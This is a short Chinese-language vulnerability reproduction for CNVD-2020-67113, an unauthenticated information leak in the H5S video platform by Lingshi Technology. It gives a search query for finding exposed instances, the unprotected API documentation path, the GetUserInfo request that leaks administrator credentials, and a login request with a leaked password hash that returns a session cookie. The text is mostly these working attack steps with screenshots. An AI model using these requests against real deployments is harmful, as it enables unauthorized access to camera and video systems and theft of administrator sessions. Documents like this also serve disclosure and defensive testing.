

# 零视科技 H5S视频平台 GetUserInfo 信息泄漏漏洞  CNVD-2020-67113

## 漏洞描述

零视技术(上海)有限公司是以领先的视频技术服务于客户，致力于物联网视频开发简单化，依托于HTML5 WebRTC 等新的技术，实现全平台视频播放简单化。
零视技术(上海)有限公司H5S CONSOLE存在未授权访问漏洞。攻击者可利用漏洞访问后台相应端口，执行未授权操作。

## 漏洞影响

<a-checkbox checked>零视科技 H5S视频平台</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="H5S视频平台|WEB"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1636073252475-8f3cb570-d930-46e3-b8a6-0a686773c84a.png)

API文档可以未授权访问

```php
/doc/api.html
```

![img](../../../.vuepress/public/img/1636074612323-f1fee2de-e43f-4842-9e03-8066f9a1b7fc.png)

存在用户账号密码泄漏的接口

```php
/api/v1/GetUserInfo?user=admin&session=
```

![img](../../../.vuepress/public/img/1636073746405-1adf993c-1e08-461a-9f7f-a3ab07f969ad.png)

其中登录接口中 Password为接口中存在的账号密码，可以直接发送请求获取Cookie

```php
/api/v1/Login?user=admin&password=02ed400b8d9289f311fc1d68a83fdaaa
```

![img](../../../.vuepress/public/img/1636073812938-d82c758c-891a-40aa-9e17-037339b99765.png)

请求成功后访问主页面

![img](../../../.vuepress/public/img/1636073852540-6758c6d5-f945-4aec-8c53-53328c3cbc7d.png)